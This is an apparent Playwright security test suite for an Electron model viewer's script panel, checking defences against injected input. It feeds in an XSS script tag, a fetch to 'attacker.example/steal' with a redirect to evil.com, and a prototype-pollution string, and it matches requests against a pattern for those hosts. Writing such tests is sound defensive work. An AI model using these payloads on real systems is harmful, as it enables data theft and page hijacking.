import { test, expect, _electron as electron } from "@playwright/test";
import path from "node:path";
import fs from "node:fs";


const viewerRoot = path.resolve(import.meta.dirname, "../..");
const testViviPath = path.resolve(import.meta.dirname, "../fixtures/test.vivi");

async function launchViewer() {
  const app = await electron.launch({
    args: [path.join(viewerRoot, "electron/main.cjs")],
    cwd: viewerRoot,
  });
  const window = await app.firstWindow();
  await window.waitForLoadState("domcontentloaded");
  await window.evaluate(() => {
    localStorage.setItem("vivi-viewer-locale", "ja");
    localStorage.removeItem("vivi-viewer-settings");
  });
  await window.reload();
  await window.waitForLoadState("domcontentloaded");
  return { app, window };
}

async function loadModel(
  window: Awaited<ReturnType<typeof launchViewer>>["window"],
) {
  const viviContent = fs.readFileSync(testViviPath, "utf-8");
  await window.locator('input[accept=".vivi"]').setInputFiles({
    name: "test.vivi",
    mimeType: "application/json",
    buffer: Buffer.from(viviContent),
  });
  await expect(window.locator("canvas")).toBeVisible({ timeout: 10_000 });
}

async function openPanel(
  window: Awaited<ReturnType<typeof launchViewer>>["window"],
) {
  const sheet = window.locator('[data-testid="side-sheet"]');
  if (!(await sheet.isVisible())) {
    await window.locator('[data-testid="settings-toggle"]').click();
    await expect(sheet).toBeVisible({
      timeout: 3_000,
    });
  }
  await window.locator('[data-testid="side-sheet-tab-input-effects"]').click();
  await expect(window.locator('[data-testid="side-sheet-panel-input-effects"]')).toBeVisible({
    timeout: 3_000,
  });
}

function scriptInput(window: Awaited<ReturnType<typeof launchViewer>>["window"]) {
  return window.locator('[data-testid="viewer-script-input"]');
}

function scriptButton(window: Awaited<ReturnType<typeof launchViewer>>["window"]) {
  return window.locator('[data-testid="viewer-script-run-button"]');
}

test("XSS 試行 (<script>alert(1)</script>) は dialog/pageerror を発生させない", async () => {
  const { app, window } = await launchViewer();
  await loadModel(window);
  await openPanel(window);
  await window.waitForTimeout(500);

  const errors: string[] = [];
  const dialogs: string[] = [];
  window.on("pageerror", (e) => errors.push(e.message));
  window.on("dialog", (d) => {
    dialogs.push(d.message());
    void d.dismiss();
  });

  const xss = "<script>alert('xss')</script>";
  await scriptInput(window).fill(xss);
  await expect(scriptInput(window)).toHaveValue(xss);

  await scriptButton(window).click();
  await expect(scriptButton(window)).toHaveText("スクリプト実行", { timeout: 3_000 });

  expect(dialogs).toHaveLength(0);
  expect(errors).toHaveLength(0);

  await app.close();
});

test("fetch/location 改竄を含む入力でも外部リクエスト・URL 遷移なし", async () => {
  const { app, window } = await launchViewer();
  const suspicious: string[] = [];
  window.on("request", (req) => {
    const url = req.url();
    if (/attacker\.example|evil\.com/i.test(url)) suspicious.push(url);
  });

  await loadModel(window);
  await openPanel(window);

  const hrefBefore = await window.evaluate(() => globalThis.location.href);

  await scriptInput(window).fill(
    "fetch('http://attacker.example/steal') window.location='http://evil.com'",
  );
  await scriptButton(window).click();
  await expect(scriptButton(window)).toHaveText("スクリプト実行", { timeout: 3_000 });

  await window.waitForTimeout(500);

  const hrefAfter = await window.evaluate(() => globalThis.location.href);
  expect(hrefAfter).toBe(hrefBefore);
  expect(suspicious).toEqual([]);

  await app.close();
});

test("wait(9999999999) は 2回目クリックでキャンセルされ UI ラベルが復帰する", async () => {
  const { app, window } = await launchViewer();
  await loadModel(window);
  await openPanel(window);

  await scriptInput(window).fill("wait(9999999999)");
  const btn = scriptButton(window);
  await btn.click();
  await expect(btn).toHaveText("停止", { timeout: 3_000 });

  await btn.click();
  await expect(btn).toHaveText("スクリプト実行", { timeout: 5_000 });

  await app.close();
});

test("__proto__ 汚染試行で Object.prototype に痕跡が残らない", async () => {
  const { app, window } = await launchViewer();
  await loadModel(window);
  await openPanel(window);

  await scriptInput(window).fill("__proto__ polluted constructor");
  await scriptButton(window).click();
  await expect(scriptButton(window)).toHaveText("スクリプト実行", { timeout: 3_000 });

  const pollution = await window.evaluate(() => {
    const obj: Record<string, unknown> = {};
    return {
      polluted: obj.polluted,
      protoKeys: Object.getOwnPropertyNames(Object.prototype).filter(
        (k) => k === "polluted",
      ),
    };
  });
  expect(pollution.polluted).toBeUndefined();
  expect(pollution.protoKeys).toEqual([]);

  await app.close();
});
